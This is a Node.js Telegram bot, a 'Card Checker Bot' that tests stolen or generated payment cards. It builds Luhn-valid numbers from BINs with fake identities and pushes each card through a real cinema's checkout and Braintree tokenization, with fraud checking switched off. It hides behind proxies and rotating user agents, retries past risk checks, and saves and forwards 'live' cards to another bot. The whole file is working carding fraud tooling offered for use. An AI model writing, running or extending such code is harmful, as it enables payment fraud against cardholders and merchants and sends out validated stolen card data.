const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { v4: uuidv4 } = require('uuid');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Configuration
const BOT_TOKEN = process.env.BOT_TOKEN;
const FORWARDERSD_TOKEN = process.env.FORWARDERSD_TOKEN;
const PROXY_HOST = process.env.PROXY_HOST || '';
const PROXY_AUTH = process.env.PROXY_AUTH || '';

if (!BOT_TOKEN) {
    console.error('ERROR: BOT_TOKEN environment variable is required.');
    process.exit(1);
}

const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
const PORT = process.env.PORT || 8080;

// Admin: comma-separated Telegram user IDs (get from getUpdates when you message the bot)
const ADMIN_IDS = (process.env.ADMIN_IDS || '8564898494,6050175626')
    .split(',')
    .map(id => parseInt(String(id).trim(), 10))
    .filter(id => !isNaN(id));

// Max cards per mass check: admins 50, non-admins 3
const MASS_MAX_CARDS = 50;
const MASS_MAX_CARDS_NON_ADMIN = 3;

// Create temp directory for cookies
const COOKIE_DIR = path.join(os.tmpdir(), 'bot_cookies');
if (!fs.existsSync(COOKIE_DIR)) {
    fs.mkdirSync(COOKIE_DIR, { recursive: true });
}

// Session storage (in-memory)
const sessions = {};

// Cancellation flags for ongoing operations
const cancelFlags = {};

function isAdmin(from) {
    if (!from || from.id == null) return false;
    return ADMIN_IDS.includes(from.id);
}

// User Agent Generator
class UserAgent {
    constructor() {
        this.userAgents = {
            chrome: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ],
            firefox: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
            ],
            iphone: [
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            ]
        };
    }

    generate(type = 'chrome') {
        type = type.toLowerCase();
        if (!this.userAgents[type]) {
            type = 'chrome';
        }
        const agents = this.userAgents[type];
        return agents[Math.floor(Math.random() * agents.length)];
    }
}

const userAgent = new UserAgent();

// Helper Functions
function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomDigits(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += Math.floor(Math.random() * 10);
    }
    return result;
}

// Luhn algorithm for card validation (cardgen v1)
function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
    }
    return sum % 10 === 0;
}

// Generate 16-digit Luhn-valid card from BIN (1-15 digits; cardgen v1)
function generateCardNumber(bin) {
    let cardNumber = bin;
    while (cardNumber.length < 15) {
        cardNumber += Math.floor(Math.random() * 10);
    }
    for (let digit = 0; digit <= 9; digit++) {
        if (luhnCheck(cardNumber + digit)) {
            cardNumber += digit;
            break;
        }
    }
    return cardNumber;
}

// Generate cards from format: PARTIAL_NUMBER|MM|YYYY/CARD_COUNT,ORDER_QUANTITY (MM/YYYY can be rnd)
// Returns { cardLines } or { error }
function parseAndGenerateCards(input) {
    const trimmed = input.trim();
    if (!/^\d{1,15}\|(?:rnd|\d{1,2})\|(?:rnd|\d{2,4})\/\d+,\d+$/.test(trimmed)) {
        return { error: 'Invalid generate format.' };
    }
    const [left, right] = trimmed.split('/');
    const leftParts = left.split('|');
    const partialNumber = leftParts[0];
    const mmRaw = leftParts[1];
    let yyyyRaw = leftParts[2];
    const rightParts = right.split(',');
    const cardCount = parseInt(rightParts[0], 10);
    const orderQty = parseInt(rightParts[1], 10);

    if (partialNumber.length < 1 || partialNumber.length > 15) {
        return { error: 'Partial number must be 1–15 digits.' };
    }
    if (mmRaw !== 'rnd') {
        const mmNum = parseInt(mmRaw, 10);
        if (mmNum < 1 || mmNum > 12) {
            return { error: 'Month must be 01–12 or rnd.' };
        }
    }
    if (yyyyRaw !== 'rnd') {
        if (yyyyRaw.length === 2) {
            yyyyRaw = '20' + yyyyRaw;
        } else if (yyyyRaw.length !== 4) {
            return { error: 'Year must be 2 or 4 digits or rnd.' };
        }
    }
    if (isNaN(cardCount) || cardCount < 2) {
        return { error: 'Card count must be at least 2.' };
    }
    if (isNaN(orderQty) || orderQty < 1) {
        return { error: 'Order quantity must be at least 1.' };
    }

    const cardLines = [];
    for (let i = 0; i < cardCount; i++) {
        const cc = generateCardNumber(partialNumber);
        const mm = mmRaw === 'rnd' ? (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0') : mmRaw;
        const yyyy = yyyyRaw === 'rnd' ? (2025 + Math.floor(Math.random() * 6)).toString() : yyyyRaw;
        const cvv = Math.floor(Math.random() * 900) + 100;
        cardLines.push(`${cc}|${mm}|${yyyy}|${cvv},${orderQty}`);
    }
    return { cardLines };
}

function extractString(str, start, end) {
    const startIndex = str.indexOf(start);
    if (startIndex === -1) return '';
    const substring = str.substring(startIndex + start.length);
    const endIndex = substring.indexOf(end);
    if (endIndex === -1) return '';
    return substring.substring(0, endIndex);
}

function safeJsonParse(data) {
    // If already an object, return as-is
    if (typeof data === 'object' && data !== null) {
        return data;
    }
    
    // If string, try to parse
    if (typeof data === 'string') {
        try {
            return JSON.parse(data);
        } catch (e) {
            console.error('JSON parse error:', e.message);
            return data;
        }
    }
    
    return data;
}

function parseCard(card, validYYYY = 4) {
    // Check if quantity is included (format: CARD|MM|YYYY|CVV,QUANTITY)
    let quantity = 1; // Default quantity
    let cardData = card;
    
    if (card.includes(',')) {
        const parts = card.split(',');
        cardData = parts[0]; // Card data before comma
        quantity = parseInt(parts[1]) || 1; // Quantity after comma (default to 1 if invalid)
    }
    
    const parts = cardData.split('|');
    let [cc, mm, yyyy, cvv] = parts;
    
    if (yyyy.length === 4 && validYYYY === 2) {
        yyyy = yyyy.substring(2);
    } else if (yyyy.length === 2 && validYYYY === 4) {
        yyyy = '20' + yyyy;
    }
    
    return { cc, mm, yyyy, cvv, quantity };
}

async function sendMessage(chatId, text, markdown = false) {
    try {
        const url = `${API_URL}sendMessage`;
        const res = await axios.get(url, {
            params: {
                chat_id: chatId,
                text: text,
                parse_mode: markdown ? 'Markdown' : undefined
            }
        });
        return res.data?.result?.message_id ?? null;
    } catch (error) {
        console.error('Error sending message:', error.message);
        return null;
    }
}

/** Edit an existing message (same chat). Falls back to sendMessage if edit fails. */
async function editMessageText(chatId, messageId, text, markdown = false) {
    if (messageId == null) return false;
    try {
        const res = await axios.get(`${API_URL}editMessageText`, {
            params: {
                chat_id: chatId,
                message_id: messageId,
                text: text,
                parse_mode: markdown ? 'Markdown' : undefined
            }
        });
        return res.data?.ok === true;
    } catch (error) {
        console.error('Error editing message:', error.message);
        return false;
    }
}

async function replyOrEdit(chatId, messageId, text, markdown = false) {
    if (messageId != null && (await editMessageText(chatId, messageId, text, markdown))) {
        return messageId;
    }
    return sendMessage(chatId, text, markdown);
}

async function forwardersd(message, chatId) {
    if (!FORWARDERSD_TOKEN) return;
    try {
        const url = `https://api.telegram.org/bot${FORWARDERSD_TOKEN}/sendMessage`;
        await axios.get(url, {
            params: {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            }
        });
    } catch (error) {
        console.error('Error forwarding message:', error.message);
    }
}

function removeCookie(cookie) {
    const files = fs.readdirSync(COOKIE_DIR);
    files.forEach(file => {
        if (file.includes(`_${cookie}.txt`)) {
            fs.unlinkSync(path.join(COOKIE_DIR, file));
        }
    });
}

async function makeRequest(url, options = {}, sessionId, cookieId) {
    const config = {
        url,
        method: options.post ? 'POST' : 'GET',
        timeout: 30000,
        headers: {
            'User-Agent': sessions[sessionId]?.useragent || userAgent.generate(),
            ...options.httpheader?.reduce((acc, header) => {
                const [key, value] = header.split(': ');
                acc[key] = value;
                return acc;
            }, {})
        }
    };

    if (options.post) {
        config.data = options.postfields;
    }

    // Setup proxy if provided
    if (PROXY_HOST && PROXY_AUTH && !options.skipProxy) {
        const proxyUrl = `http://${PROXY_AUTH}@${PROXY_HOST}`;
        config.httpsAgent = new HttpsProxyAgent(proxyUrl);
        config.proxy = false;
    }

    // Cookie handling
    const cookieFile = path.join(COOKIE_DIR, `${process.pid}_${cookieId}.txt`);
    if (fs.existsSync(cookieFile)) {
        const cookies = fs.readFileSync(cookieFile, 'utf8');
        config.headers['Cookie'] = cookies;
    }

    try {
        const response = await axios(config);
        
        // Save cookies
        if (response.headers['set-cookie']) {
            fs.writeFileSync(cookieFile, response.headers['set-cookie'].join('; '));
        }
        
        // Return data as-is (axios already parses JSON)
        // If it's a string and looks like JSON, parse it
        if (typeof response.data === 'string' && (response.data.startsWith('{') || response.data.startsWith('['))) {
            try {
                return JSON.parse(response.data);
            } catch (e) {
                return response.data;
            }
        }
        
        return response.data;
    } catch (error) {
        if (error.response) {
            // Handle error response data
            if (typeof error.response.data === 'string' && (error.response.data.startsWith('{') || error.response.data.startsWith('['))) {
                try {
                    return JSON.parse(error.response.data);
                } catch (e) {
                    return error.response.data;
                }
            }
            return error.response.data;
        }
        throw error;
    }
}

// Express App
const app = express();
app.use(express.json());

app.post('/', async (req, res) => {
    const update = req.body;
    
    if (!update || !update.message) {
        return res.sendStatus(200);
    }

    const message = update.message;
    const chatId = message.chat.id;
    const text = (message.text || '').trim();
    const isAdminUser = isAdmin(message.from);

    if (!chatId) {
        return res.sendStatus(200);
    }

    // Handle commands
    if (text === '/start') {
        await sendMessage(chatId, 
            "🤖 *Card Checker Bot*\n\n*Commands:*\n/check - Check a single card\n/mass - Check multiple cards (3 max)\n/help - Show help\n/stop - Cancel ongoing check\n\n💵 *Amount per quantity:*\nEach quantity is equivalent to $10.50\n\n*Formats:*\n• Single/mass: `CC|MM|YYYY|CVV` or `CC|MM|YYYY|CVV,QTY`\n• Generate: `PARTIAL|MM|YYYY/COUNT,ORDER_QTY` (Luhn-valid 16-digit cards; MM/YYYY can be `rnd`)\n\n*Examples:*\n`4350940005555920|07|2025|123,15`\n`424242424242|08|2025/3,15` or `424242424242|rnd|rnd/3,15`", 
            true
        );
        return res.sendStatus(200);
    }

    if (text === '/help') {
        await sendMessage(chatId, 
            "📋 *Help*\n\n*Card format:*\n`CC|MM|YYYY|CVV` or `CC|MM|YYYY|CVV,QTY`\n\n*Generate format:*\n`PARTIAL|MM|YYYY/COUNT,ORDER_QTY`\n(1–15 digit BIN → Luhn-valid 16-digit cards, CVV 100–999. Use \`rnd\` for MM or YYYY for random; max 3.)\n\n*Examples:*\n`4350940005555920|07|2025|123,15`\n`424242424242|08|2025/3,15` or `424242424242|rnd|rnd/3,15`\n\nJust send a card or generate line to check.", 
            true
        );
        return res.sendStatus(200);
    }

    if (text === '/check') {
        await sendMessage(chatId, 
            "💳 *Check a card*\n\nCheck a single card. Send one line in this format:\n\n`CCNUMBER|MM|YYYY|CVV` or `CCNUMBER|MM|YYYY|CVV,QUANTITY`\n\n*Examples:*\n`4350940005555920|07|2025|123`\n`4350940005555920|07|2025|123,15` (quantity 15)", 
            true
        );
        return res.sendStatus(200);
    }

    if (text === '/stop') {
        // Set cancel flag for this user
        cancelFlags[chatId] = true;
        
        await sendMessage(chatId, 
            "🛑 *Stop Request Received*\n\nCancelling ongoing card check...\n\nThe bot will stop processing as soon as possible.", 
            true
        );
        return res.sendStatus(200);
    }

    if (text === '/mass') {
        await sendMessage(chatId, 
            "📦 *Mass Check*\n\n• Can check up to 3 cards per message\n\n*Option A – send cards* (one per line):\n`CC|MM|YYYY|CVV` or `CC|MM|YYYY|CVV,QTY`\n\n*Option B – generate cards* (single line, Luhn-valid):\n`PARTIAL|MM|YYYY/COUNT,ORDER_QTY` (MM/YYYY can be `rnd`)\nExample: `424242424242|08|2025/3,15` or `424242424242|rnd|rnd/3,15`\n\nUse /stop to cancel.", 
            true
        );
        return res.sendStatus(200);
    }

    if (text === '/admin') {
        if (!isAdminUser) {
            await sendMessage(chatId, '⛔ *Access denied.*\n\nThis command is for admins only.', true);
            return res.sendStatus(200);
        }
        await sendMessage(chatId, 
            '🔐 *Admin panel*\n\nYou have admin access.\n• Card checking: admins only\n• Mass check: up to 50 cards per message\n\nSet `ADMIN_IDS` in Railway to add more admins.', 
            true
        );
        return res.sendStatus(200);
    }

    // Check for generate format: PARTIAL_NUMBER|MM|YYYY/CARD_COUNT,ORDER_QUANTITY (MM/YYYY can be rnd; single line)
    if (/^\d{1,15}\|(?:rnd|\d{1,2})\|(?:rnd|\d{2,4})\/\d+,\d+$/.test(text.trim())) {
        const generateResult = parseAndGenerateCards(text);
        if (generateResult.cardLines) {
            const maxMass = isAdminUser ? MASS_MAX_CARDS : MASS_MAX_CARDS_NON_ADMIN;
            if (generateResult.cardLines.length > maxMass) {
                await sendMessage(chatId, 
                    `❌ *Generated count exceeds limit*\n\nYou requested ${generateResult.cardLines.length} cards. Your maximum is *${maxMass}* per mass check.\n\nUse a lower count or ask an admin.`, 
                    true
                );
                return res.sendStatus(200);
            }
            await sendMessage(chatId, `📦 *Generating ${generateResult.cardLines.length} cards…*\n\nRunning mass check. Use /stop to cancel.`, true);
            processMassCards(chatId, generateResult.cardLines);
            return res.sendStatus(200);
        }
        if (generateResult.error) {
            await sendMessage(chatId, 
                `❌ *Generate format error*\n\n${generateResult.error}\n\n*Format:* \`PARTIAL|MM|YYYY/COUNT,ORDER_QTY\`\n*Example:* \`424242424242|08|2025/50,15\`\n(1–15 digits, then /count,orderQty; admins max 50, others max 3.)`, 
                true
            );
            return res.sendStatus(200);
        }
    }

    // Check for mass check: multiple cards, one per line (admins up to 50, non-admins up to 3)
    const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
    const cardLines = lines.filter(line => /^\d{15,16}\|/.test(line));
    
    if (cardLines.length >= 2) {
        const maxMass = isAdminUser ? MASS_MAX_CARDS : MASS_MAX_CARDS_NON_ADMIN;
        if (cardLines.length > maxMass) {
            await sendMessage(chatId, 
                `❌ *Too many cards*\n\nYou sent ${cardLines.length} cards. Maximum is *${maxMass}* cards per mass check.\n\nPlease send ${maxMass} or fewer cards, one per line.`, 
                true
            );
            return res.sendStatus(200);
        }
        processMassCards(chatId, cardLines);
        return res.sendStatus(200);
    }

    // Check if message contains single card data (with optional quantity)
    if (/^\d{15,16}\|/.test(text)) {
        cancelFlags[chatId] = false; // New single-card run
        processCard(chatId, text);
        return res.sendStatus(200);
    } else {
        await sendMessage(chatId, 
            "❌ Invalid format!\n\nPlease send card in format:\n`CCNUMBER|MM|YYYY|CVV` or `CCNUMBER|MM|YYYY|CVV,QUANTITY`\n\nExamples:\n`4350940005555920|07|2025|123`\n`4350940005555920|07|2025|123,15` (quantity 15)", 
            true
        );
        return res.sendStatus(200);
    }
});

async function processCard(chatId, cardText, massOpts = null) {
    // Do not clear cancel flag here — mass check must see /stop; single/mass runners set false when starting
    const cookie = randomString(10);
    const sessionId = `session_${chatId}_${Date.now()}`;
    let statusMessageId = null;

    sessions[sessionId] = {
        useragent: userAgent.generate()
    };

    try {
        // Check for cancellation
        if (cancelFlags[chatId]) {
            await sendMessage(chatId, "🛑 *Cancelled*\n\nCard check cancelled by user.", true);
            delete cancelFlags[chatId];
            return;
        }
        // Get random user info with error handling
        let userDetails;
        try {
            const userInfo = await axios.get('https://randomuser.me/api/', { timeout: 5000 });
            const user = userInfo.data?.results?.[0];
            
            if (user && user.name) {
                userDetails = {
                    n: user.name.first,
                    l: user.name.last,
                    e: randomString(7) + '@gmail.com',
                    st: `${user.location.street.number} ${user.location.street.name}`,
                    ct: user.location.city,
                    state: user.location.state,
                    country: user.location.country,
                    zip: user.location.postcode,
                    phn: '212' + Math.floor(Math.random() * 10000000),
                    formkey: randomString(16),
                    webkey: randomString(16)
                };
            } else {
                throw new Error('Invalid user data');
            }
        } catch (apiError) {
            // Fallback to random generated data
            console.log('Random user API failed, using fallback data:', apiError.message);
            userDetails = {
                n: 'John',
                l: 'Doe',
                e: randomString(7) + '@gmail.com',
                st: `${Math.floor(Math.random() * 9999) + 1} Main Street`,
                ct: 'New York',
                state: 'NY',
                country: 'United States',
                zip: String(Math.floor(Math.random() * 90000) + 10000),
                phn: '212' + Math.floor(Math.random() * 10000000),
                formkey: randomString(16),
                webkey: randomString(16)
            };
        }

        const { cc, mm, yyyy, cvv, quantity } = parseCard(cardText, 4);
        const yy = yyyy.length === 4 ? yyyy.substring(2) : yyyy;
        
        // Calculate amount ($10.50 per quantity)
        const pricePerQuantity = 10.50;
        const totalAmount = (quantity * pricePerQuantity).toFixed(2);
        
        console.log(`Processing card with quantity: ${quantity}, amount: $${totalAmount}`);

        const processingText = massOpts && massOpts.massTotal > 1
            ? `⏳ *Processing cards...*\n\n${massOpts.massIndex}/${massOpts.massTotal}\n\nPlease wait...`
            : `⏳ *Processing card...*\n\nPlease wait...`;
        statusMessageId = await sendMessage(chatId, processingText, true);

        let retry = 0;
        let result = null;

        while (retry <= 3 && !result) {
            // Check for cancellation
            if (cancelFlags[chatId]) {
                removeCookie(cookie);
                delete sessions[sessionId];
                await replyOrEdit(chatId, statusMessageId, "🛑 *Cancelled*\n\n💳 `" + cardText + "`\n\nCard check cancelled by user.", true);
                delete cancelFlags[chatId];
                return;
            }

            try {
                // Step 1: Create Order
                const order = await makeRequest(
                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/CreateOrder',
                    {
                        post: true,
                        postfields: JSON.stringify({ cinemaId: "2110", userID: "" }),
                        httpheader: ['content-type: application/json']
                    },
                    sessionId,
                    cookie
                );

                // Safely parse order response
                const orderData = safeJsonParse(order);
                if (!orderData?.Result?.order?.userSessionId) {
                    throw new Error('Failed to create order - invalid response');
                }
                const userSessionId = orderData.Result.order.userSessionId;

                // Step 2: Get Payment Client Token
                const tokenResponse = await makeRequest(
                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/PaymentClientToken',
                    {
                        post: true,
                        postfields: JSON.stringify({ cinemaId: "2110" }),
                        httpheader: ['content-type: application/json']
                    },
                    sessionId,
                    cookie
                );

                // Safely parse token response
                const tokenData = safeJsonParse(tokenResponse);
                if (!tokenData?.ClientToken) {
                    throw new Error('Failed to get payment token - invalid response');
                }
                const clientToken = tokenData.ClientToken;
                const decodedToken = Buffer.from(clientToken, 'base64').toString('utf-8');
                const authorizationFingerprint = extractString(decodedToken, '"authorizationFingerprint":"', '"');
                
                if (!authorizationFingerprint) {
                    throw new Error('Failed to extract authorization fingerprint');
                }

                // Step 3: Add Concessions (with dynamic quantity)
                await makeRequest(
                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/AddConcessionsOrder',
                    {
                        post: true,
                        postfields: `{"cinemaId":"2110","concessionItems":[{"Id":"706","HeadOfficeItemCode":"","HOPK":"706","Description":"SABE Paloma","DescriptionAlt":"","DescriptionTranslations":[],"ExtendedDescription":"","ExtendedDescriptionAlt":"","ExtendedDescriptionTranslations":[],"PriceInCents":1050,"TaxInCents":93,"IsVariablePriceItem":false,"MinimumVariablePriceInCents":null,"MaximumVariablePriceInCents":null,"ItemClassCode":"0050","RequiresPickup":false,"CanGetBarcode":false,"ShippingMethod":"N","RestrictToLoyalty":false,"LoyaltyDiscountCode":"","RecognitionMaxQuantity":0,"RecognitionPointsCost":0,"RecognitionBalanceTypeId":null,"IsRecognitionOnly":false,"RecognitionId":0,"RecognitionSequenceNumber":0,"RecognitionExpiryDate":null,"RedeemableType":1,"IsAvailableForInSeatDelivery":false,"IsAvailableForPickupAtCounter":true,"VoucherSaleType":"","AlternateItems":[],"PackageChildItems":[],"ModifierGroups":[],"SmartModifiers":[],"DiscountsAvailable":[],"RecipeItems":[],"SellingLimits":{"DailyLimits":[],"IndefiniteLimit":null},"SellingTimeRestrictions":[],"RequiresPreparing":true,"is_restricted":false,"quantity":${quantity},"IsSeatDelivery":false}],"userSessionId":"${userSessionId}","seats":[],"userID":""}`,
                        httpheader: ['content-type: application/json']
                    },
                    sessionId,
                    cookie
                );

                // Step 4: Tokenize Card
                const braintreeResponse = await makeRequest(
                    'https://payments.braintree-api.com/graphql',
                    {
                        post: true,
                        postfields: JSON.stringify({
                            clientSdkMetadata: {
                                source: "client",
                                integration: "dropin2",
                                sessionId: uuidv4()
                            },
                            query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                            variables: {
                                input: {
                                    creditCard: {
                                        number: cc,
                                        expirationMonth: mm,
                                        expirationYear: yyyy,
                                        billingAddress: {
                                            postalCode: String(Math.floor(Math.random() * 88889) + 11111)
                                        }
                                    },
                                    options: { validate: false }
                                }
                            },
                            operationName: "TokenizeCreditCard"
                        }),
                        httpheader: [
                            'content-type: application/json',
                            `Authorization: Bearer ${authorizationFingerprint}`,
                            'braintree-version: 2018-05-10'
                        ]
                    },
                    sessionId,
                    cookie
                );

                // Safely parse braintree response
                const braintreeData = safeJsonParse(braintreeResponse);
                if (!braintreeData?.data?.tokenizeCreditCard?.token) {
                    throw new Error('Failed to tokenize card - invalid response from Braintree');
                }
                const token = braintreeData.data.tokenizeCreditCard.token;

                // Step 5: Checkout
                const checkoutResponse = await makeRequest(
                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/paymentapi/Checkout',
                    {
                        post: true,
                        postfields: JSON.stringify({
                            PaymentToken: token,
                            userSessionId: userSessionId,
                            Name: `${userDetails.n} ${userDetails.l}`,
                            Email: userDetails.e,
                            userID: "",
                            skipBraintree: false,
                            skipAdvancedFraudChecking: true,
                            remainingOrderValue: -1
                        }),
                        httpheader: ['content-type: application/json']
                    },
                    sessionId,
                    cookie
                );

                // Convert checkout response to searchable text
                const responseObj = safeJsonParse(checkoutResponse);
                const responseText = typeof checkoutResponse === 'string' ? checkoutResponse : JSON.stringify(responseObj);

                // Check for retry conditions
                if ((responseText.includes('risk_threshold') || 
                     responseText.includes('Amount must be greater than zero') ||
                     responseText.includes('This order has either expired') ||
                     responseText.includes('Cannot determine payment method') ||
                     !responseText) && retry < 3) {
                    retry++;
                    removeCookie(cookie);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    // Check for cancellation after wait
                    if (cancelFlags[chatId]) {
                        delete sessions[sessionId];
                        await replyOrEdit(chatId, statusMessageId, "🛑 *Cancelled*\n\n💳 `" + cardText + "`\n\nCard check cancelled by user.", true);
                        delete cancelFlags[chatId];
                        return;
                    }

                    continue;
                }

                // Check results
                if (responseText.includes('avs') || 
                    responseText.includes('"IsValid":true') || 
                    responseText.includes('Insufficient') || 
                    responseText.includes('Limit') || 
                    responseText.includes('VistaBookingNumber')) {
                    
                    // Save live card
                    fs.appendFileSync('CCNLIVES_TG.txt', cardText + '\n');
                    
                    let errorMsg = 'Success';
                    const parsedResponse = safeJsonParse(responseObj);
                    errorMsg = parsedResponse?.ErrorMessage || 'Payment Authorised';
                    
                    // Extract VistaBookingNumber from response
                    const vistaBookingNumber = parsedResponse?.VistaBookingNumber 
                        || parsedResponse?.Result?.VistaBookingNumber 
                        || parsedResponse?.vistaBookingNumber 
                        || 'N/A';
                    
                    // Forward to notification with amount, response and VistaBookingNumber
                    await forwardersd(
                        `✅ <b>Live Card</b>\n\n` +
                        `💳 ${cc}|${mm}|${yyyy}|${cvv}\n` +
                        `💰 Amount: $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n` +
                        `📋 Confirmation Number: ${vistaBookingNumber}\n` +
                        `📝 Response: ${errorMsg}`, 
                        6050175626
                    );
                    
                    result = {
                        status: 'live',
                        message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n📋 *Confirmation Number:* ${vistaBookingNumber}\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
                    };
                } else if (retry >= 3) {
                    let errorMsg = 'Unknown error';
                    if (responseText.includes('risk_threshold')) {
                        errorMsg = `Gateway Rejected: risk_threshold (after ${retry} retries)`;
                    } else if (responseText.includes('Amount must be greater than zero')) {
                        errorMsg = `Error: Amount must be greater than zero (after ${retry} retries)`;
                    } else if (responseText.includes('Cannot determine payment method')) {
                        errorMsg = `Error: Cannot determine payment method (after ${retry} retries)`;
                    } else if (responseText.includes('This order has either expired')) {
                        errorMsg = `Error: This order has either expired or it has already been processed (after ${retry} retries)`;
                    } else if (!responseText) {
                        errorMsg = `no response (after ${retry} retries)`;
                    }
                    
                    result = {
                        status: 'dead',
                        message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
                    };
                } else {
                    const parsedResponse = safeJsonParse(responseObj);
                    let errorMsg = parsedResponse?.ErrorMessage || 'Declined';
                    
                    // If no error message found, use part of the response
                    if (errorMsg === 'Declined' && responseText) {
                        errorMsg = responseText.substring(0, 100) || 'Declined';
                    }
                    
                    result = {
                        status: 'dead',
                        message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n\n📝 *Response:*\n${errorMsg}`
                    };
                }
            } catch (error) {
                if (retry < 3) {
                    retry++;
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    continue;
                }
                throw error;
            }
        }

        removeCookie(cookie);
        delete sessions[sessionId];
        // Do not delete cancelFlags here — mass check must see /stop between cards

        if (result) {
            await replyOrEdit(chatId, statusMessageId, result.message, true);
        }

    } catch (error) {
        console.error('Error processing card:', error);
        removeCookie(cookie);
        delete sessions[sessionId];
        // Do not delete cancelFlags here — mass check must see /stop between cards
        await replyOrEdit(chatId, statusMessageId, `⚠️ *ERROR*\n\n💳 \`${cardText}\`\n\n📝 *Error:*\n${error.message}`, true);
    }
}

async function processMassCards(chatId, cardLines) {
    const total = cardLines.length;
    cancelFlags[chatId] = false; // New run: clear any previous /stop so we don't cancel immediately

    await sendMessage(chatId, 
        `📦 *Mass check started*\n\n${total} card(s) — processing one by one.\nUse /stop to cancel.`, 
        true
    );

    for (let i = 0; i < cardLines.length; i++) {
        if (cancelFlags[chatId]) {
            await sendMessage(chatId, `🛑 *Mass check cancelled* by user. Processed ${i}/${total} cards.`, true);
            delete cancelFlags[chatId];
            return;
        }

        await processCard(chatId, cardLines[i], { massIndex: i + 1, massTotal: total });

        // Short delay between cards to avoid rate limits
        if (i < cardLines.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }

    delete cancelFlags[chatId]; // Clean up so next run starts fresh
    await sendMessage(chatId, `✅ *Mass check done*\n\n${total} card(s) processed.`, true);
}

// Health check
app.get('/', (req, res) => {
    res.send('Telegram Bot is running!');
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`✅ Bot server running on port ${PORT}`);
    console.log(`✅ Webhook: https://your-domain.com/`);
    console.log(`✅ Health: https://your-domain.com/health`);
});
